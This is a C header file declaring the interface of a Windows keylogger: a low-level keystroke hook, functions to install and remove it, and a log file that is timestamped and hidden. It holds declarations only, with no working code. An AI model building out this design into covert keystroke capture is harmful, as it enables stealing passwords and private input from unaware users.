#ifndef LOGGER_H
#define LOGGER_H

#include <windows.h>

// Keylogging hook that logs low level keystrokes
LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam);

// Sets the keylogging hook
int setupHook();

// Removes the keylogging hook
int removeHook();

// Opens log file for appending, inserts timestamp, and hides the file
void initLogFile();

#endif